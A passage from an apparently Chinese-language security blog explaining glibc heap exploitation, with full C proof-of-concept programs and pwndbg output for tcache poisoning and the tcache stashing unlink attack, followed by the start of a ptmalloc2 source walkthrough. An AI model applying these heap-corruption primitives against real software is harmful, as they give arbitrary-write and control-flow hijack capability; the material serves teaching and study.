class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	assert((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个malloc然后两个free之后,两个堆块就放到tcache中了</p>
<p>如果没有tcache,这俩都应该放在fastbin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x8403000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Free <span class="title function_">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span><br><span class="line">Addr: 0x8403250</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free <span class="title function_">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span><br><span class="line">Addr: 0x84032e0</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x8403260</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x8403370</span><br><span class="line">Size: 0x20c91</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tcache</span><br><span class="line">&#123;</span><br><span class="line">  counts = <span class="string">&quot;\000\000\000\000\000\000\000\002&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">55</span> times&gt;,</span><br><span class="line">  entries = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x84032f0</span>, <span class="number">0x0</span> &lt;repeats <span class="number">56</span> times&gt;&#125;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; tcachebin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x84032f0</span> —▸ <span class="number">0x8403260</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcachebin[idx]&quot;]----&gt;b[&quot;b@0x84032f0&quot;]----&gt;a[&quot;a@0x8403260&quot;]----&gt;null</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此时b[0]就是其指向a的next指针,直接修改b[0]就可以玩坏tcache</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tcachebins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x84032f0</span> —▸ <span class="number">0x7ffffffedde8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>



<p>这就把栈上的<code>stack_var@0x0x7ffffffedde8</code>连接到tcache上了</p>
<p>下一次分配会拿走b</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcachebin[idx]&quot;]----&gt;stack_var[&quot;stack_var@0x0x7ffffffedde8&quot;]----&gt;null</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再下一次分配c就会拿走stack_var</p>
<p>也就是说c指向<code>0x0x7ffffffedde8</code>这个地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">1</span> = (<span class="type">intptr_t</span> *) <span class="number">0x7ffffffedde8</span></span><br></pre></td></tr></table></figure>

<p>如果我们把<code>b[0] = (intptr_t)&amp;stack_var;</code></p>
<p>改成<code>b[0] = (intptr_t)&amp;rip;</code>也就是篡改了函数返回地址</p>
<p>然后就可以通过<code>c[0]=&amp;vuln_func</code>进行ROP攻击</p>
<h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先顺序分配9个堆块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后把[3,8]这六个放到tcache中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后将1放到tcache中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>

<p>此时tcache中的结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcache[idx]&quot;]----&gt;1----&gt;8----&gt;7----&gt;6----&gt;5----&gt;4----&gt;3</span><br></pre></td></tr></table></figure>

<p>然后将0和2先后放到unsortedbin上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">	unsortedbin&lt;----&gt;2&lt;----&gt;1</span><br></pre></td></tr></table></figure>

<p>然后分配一个0xa0大小的堆块,显然所有0x90的堆块都不合适,需要到topchunk上切割新的,但是对这个0xa0的分配过程中,会让unsortedbin中的堆块分类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">smallbin[&quot;smallbin[idx]&quot;]&lt;----&gt;1&lt;----&gt;2</span><br></pre></td></tr></table></figure>

<p>然后分配两个0x90,这次命中tcache</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcache[idx]&quot;]----&gt;5----&gt;4----&gt;3</span><br></pre></td></tr></table></figure>

<p>然后篡改位于smallbin中的2号堆块的bk指针,改成stack_var的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk_lis[2][1] = (unsigned long)stack_var;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">smallbin[&quot;smallbin[idx]&quot;]&lt;----&gt;1&lt;----&gt;2----&gt;stack_var</span><br></pre></td></tr></table></figure>

<p>然后calloc(1,0x90)会绕过lib_malloc,直接调用int_malloc,这就绕过了tcache分配,使用smallbin分配,把1号堆块从smallbin上卸下来,然后将2和伪造的stack_var假堆块放到tcache中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcache[idx]&quot;]----&gt;stack_var----&gt;2----&gt;5----&gt;4----&gt;3</span><br></pre></td></tr></table></figure>

<p>此时再分配<code> target = malloc(0x90);</code>就是在libc_malloc中使用tcache进行分配</p>
<p>target拿到的就是一个栈地址了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;stack_var</span><br><span class="line">$<span class="number">3</span> = (<span class="type">unsigned</span> <span class="type">long</span> (*)[<span class="number">16</span>]) <span class="number">0x7fffffffd2e0</span></span><br><span class="line">pwndbg&gt; p target</span><br><span class="line">$<span class="number">4</span> = (<span class="type">unsigned</span> <span class="type">long</span> *) <span class="number">0x7fffffffd2f0</span></span><br></pre></td></tr></table></figure>
















      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/10/26/malloc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/26/malloc/" class="post-title-link" itemprop="url">glibc2.23 Ptmalloc2 源码分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-10-26 22:03:00 / Modified: 22:04:01" itemprop="dateCreated datePublished" datetime="2023-10-26T22:03:00+08:00">2023-10-26</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Dive-Into-Ptmalloc2"><a href="#Dive-Into-Ptmalloc2" class="headerlink" title="Dive Into Ptmalloc2"></a>Dive Into Ptmalloc2</h1><p><del>基于glibc2.23的ptmalloc2源码分析</del></p>
<h2 id="datastructure"><a href="#datastructure" class="headerlink" title="datastructure"></a>datastructure</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><p>堆空间管理的最小单元</p>
<p>每个堆块由元数据和数据两部分组成</p>
<p>元数据记录了该堆块的物理前块大小,本块大小,分配区,前块使用,是否<code>mmap</code>块状态,以及空闲状态下的前驱后继指针</p>
<p>数据就是返回给用户的可用空间</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<h4 id="字段意义"><a href="#字段意义" class="headerlink" title="字段意义"></a>字段意义</h4><h5 id="prev-size"><a href="#prev-size" class="headerlink" title="prev_size"></a>prev_size</h5><p>如果物理上紧挨着的一个<code>chunk</code>空闲的话,则该值为物理上前面紧挨着的那个<code>chunk</code>的大小.</p>
<p>如果物理上紧挨着的一个<code>chunk</code>占用的话,则该值可以被物理上紧挨着的那个<code>chunk</code>使用(空间复用)</p>
<h5 id="size"><a href="#size" class="headerlink" title="size"></a>size</h5><p>本chunk的大小,包括chunk头和<code>chunk</code>数据</p>
<blockquote>
<p>其中chunk头就是<code>malloc_chunk</code>结构体,chunk数据就是返回给用户使用的内存空间</p>
</blockquote>
<p>每个<code>chunk</code>的大小都必须是<code>2*SIZE_SZ</code>整数倍</p>
<p>32位系统中size_sz&#x3D;4,64位系统中size_sz&#x3D;8</p>
<p>因此32位系统上chunk大小是8的倍数,64位上chunk是16的倍数</p>
<p>诚如是,则size的低3位永远用不到,为了节省空间,ptmalloc的实现中,这三个低位表示三个符号A,M,P</p>
<h5 id="fd-bk"><a href="#fd-bk" class="headerlink" title="fd,bk"></a>fd,bk</h5><p>当本chunk空闲并且挂在bin上,此时fd,bk分别是前向和后向chunk的指针,相当于双向链表.</p>
<p>注意是逻辑上相邻,也就是链表相连,不是物理上相邻</p>
<h5 id="fd-nextsize-bk-nextsize"><a href="#fd-nextsize-bk-nextsize" class="headerlink" title="fd_nextsize,bk_nextsize"></a>fd_nextsize,bk_nextsize</h5><p>当chunk空闲并且挂在large bin中时,用于查找最近匹配的空闲chunk</p>
<p>怎么个用法呢?</p>
<p>large bin中挂着的chunk是按照大小排序的,一个chunk逻辑上相连的chunk可能大小相同,也可能不同,fd_nextsize,bk_nextsize就指向第一个<strong>大小不同</strong>的chunk</p>
<p>这样说比较抽象,具体见后面的largebin结构</p>
<h4 id="空间复用"><a href="#空间复用" class="headerlink" title="空间复用"></a>空间复用</h4><h5 id="分配时状态"><a href="#分配时状态" class="headerlink" title="分配时状态"></a>分配时状态</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> <span class="title function_">unallocated</span> <span class="params">(P clear)</span>  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             <span class="params">(malloc_usable_size() bytes)</span>                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             <span class="params">(size of chunk, but used <span class="keyword">for</span> application data)</span>    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>

<h5 id="空闲时状态"><a href="#空闲时状态" class="headerlink" title="空闲时状态"></a>空闲时状态</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">      |             Size of previous chunk                            |</span><br><span class="line">      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    `head:<span class="string">&#x27; |             Size of chunk, in bytes                         |P|</span></span><br><span class="line"><span class="string">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">      |             Forward pointer to next chunk in list             |</span></span><br><span class="line"><span class="string">      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">      |             Back pointer to previous chunk in list            |</span></span><br><span class="line"><span class="string">      